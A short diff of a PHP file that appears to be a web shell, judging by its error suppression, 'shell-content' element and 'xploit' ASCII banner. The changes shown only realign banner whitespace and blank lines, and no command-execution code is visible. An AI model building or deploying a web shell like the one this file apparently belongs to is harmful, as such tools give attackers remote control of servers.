@@ -1,4 +1,3 @@
-
 <?php
 session_start();
 @error_reporting(0);
@@ -684,12 +683,12 @@ if (isset($_GET["feature"])) {
             <pre id="shell-content">
                 <div id="shell-logo">
  
-                           _                   _       _ _       <span></span>
+                          _                   _       _ _       <span></span>
  _ __ ___   ___ _ ______ | | __   __  __ ___ | | ___ |_| |_     <span></span>
 | '_ ' _  \/ _ \ '__\__ '| |/ /   \ \/ /' _ \| |/ _ \| |  _|    <span></span>
 | | | | | |  __/ |  / _  |   (     )  (| |_) | | (_) | | |_     <span></span>
 |_| |_| |_|\___\_|  \__,_|_|\_\   /_/\_\  __/|_|\___/|_|\__|    <span></span>
-                    |_|  
+                                       |_|                      <span></span>
  
  
  
@@ -705,3 +704,5 @@ if (isset($_GET["feature"])) {
     </body>
 
 </html>
+
+
